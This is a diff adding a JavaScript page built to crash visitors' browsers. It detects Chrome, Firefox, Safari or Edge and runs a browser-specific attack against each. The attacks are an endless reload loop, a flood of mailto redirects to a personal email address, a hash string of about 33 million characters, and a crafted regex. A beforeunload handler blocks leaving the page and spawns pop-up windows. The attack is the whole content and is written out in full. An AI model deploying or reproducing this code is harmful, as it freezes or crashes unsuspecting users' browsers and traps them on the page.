@@ -1,0 +1,62 @@
+<script>
+
+    if(navigator.userAgent.indexOf("Chrome") != -1 ){
+      // Code to run in Chrome browser
+      console.log("This code is running in Chrome or a chrome based browser. This was to easy to make crash..");
+      // Code to crash Chrome
+  
+            setTimeout(function(){
+        while(1)location.reload(1)
+      }, 1000)
+    }
+  
+  
+  
+    else if(navigator.userAgent.indexOf("Firefox") != -1 ){
+      // Code to run in Firefox browser
+      console.log("This code is running in Firefox.");
+      // Code to crash Firefox
+      document.write("Wow! You are using Firefox! This was a hard one to make crash!");
+      for (var i = 0; i < 10000000000000 ; i++) {
+      window.location.href='mailto:jaxfry999@gmail.com';
+      document.write("Hope that worked!");
+      }
+      }
+  
+    else if(navigator.userAgent.indexOf("Safari") != -1){
+      // Code to run in Safari browser
+      console.log("This code is running in Safari.");
+      // Code to crash Safari
+      window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
+      }
+    
+    else if(navigator.userAgent.indexOf("MSIE") != -1 ){
+      // Code to run in Internet Explorer browser
+      console.log("This code is running in Internet Explorer.");
+        // Code to crash Internet Explorer
+    }
+    else if(navigator.userAgent.indexOf("Edg") != -1 ){
+      // Code to run in Microsoft Edge browser
+      console.log("This code is running in Microsoft Edge.");
+        // Code to crash Microsoft Edge
+    var foo = "Change or cancel my flight booking";
+    var match = "a";
+    foo.replace(new RegExp(match + "(?!([^<]+)?>)", 'gu'), '<span class="text-highlight">${match}</span>');
+    }
+    else{
+      // Code to run for other browsers
+      console.log("This code is running in a different browser.");
+      document.write("This code is running in a different browser. I might add support for other browsers later.");
+    }
+
+    window.addEventListener('beforeunload', function(e) {
+        e.preventDefault();
+        e.returnValue = '';
+
+        for (var i = 0; i < 5; i++) {
+            window.open(window.location.href);
+            window.open("https://www.youtube.com/watch?v=13d5d6LVEpU");
+        }
+    });
+  
+  </script>
